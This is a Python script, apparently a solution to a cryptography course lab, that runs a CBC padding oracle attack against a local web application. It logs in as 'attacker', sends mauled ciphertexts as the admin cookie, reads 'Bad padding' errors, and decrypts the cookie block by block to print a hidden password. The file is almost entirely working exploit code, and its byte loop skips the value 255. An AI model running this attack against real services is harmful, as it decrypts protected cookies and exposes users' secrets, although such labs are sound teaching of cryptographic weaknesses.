import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend

from requests import Session, codes
from maul import do_login_form, do_setcoins_form

import base64
import binascii


# You should implement this padding oracle object
# to craft the requests containing the mauled
# ciphertexts to the right URL.
class PaddingOracle(object):
    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(ciphers.algorithms.AES.block_size / 8)

    @property
    def block_length(self):
        return self._block_size_bytes

    # you'll need to send the provided ciphertext
    # as the admin cookie, retrieve the request,
    # and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        sess = Session()
        assert do_login_form(sess, "attacker", "attacker")

        sess.cookies.set(
            name="admin", value=ct.hex(), domain=sess.cookies.list_domains()[0]
        )

        data_dict = {
            "username": "attacker",
            "amount": str(100),
        }
        response = sess.post(self.url, data_dict).text

        if "Bad padding for admin cookie" in response:
            return False
        return True


def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]


def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle.
    @ctx: a ciphertext
    """
    assert (
        len(ctx) == 2 * po.block_length
    ), "This function only accepts 2 block " "cipher texts. Got {} block(s)!".format(
        len(ctx) / po.block_length
    )
    c0, c1 = list(split_into_blocks(ctx, po.block_length))

    c_prime = bytearray(po.block_length)
    msg_block = bytearray(po.block_length)

    for i in range(1, po.block_length + 1):

        for rand_byte in range(0xFF):
            c_prime[-i] = rand_byte
            new_ctx = c_prime + c1

            if po.test_ciphertext(new_ctx):
                msg_block[-i] = rand_byte ^ i ^ c0[-i]

                for j in range(1, i + 1):
                    c_prime[-j] ^= (i + 1) ^ i
                break

    return msg_block.decode()


def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle.
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.
    result = ""
    for j, i in zip(ctx_blocks[:-1], ctx_blocks[1:]):
        result += po_attack_2blocks(po, j + i)
    return result


if __name__ == "__main__":
    cookie = bytes.fromhex(input("Input cookie to decrypt:"))
    # cookie = bytes.fromhex(
    #     "e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"
    # )
    po = PaddingOracle("http://localhost:8080/setcoins")
    pw = po_attack(po, cookie)
    
    print("Hidden Password:", pw)
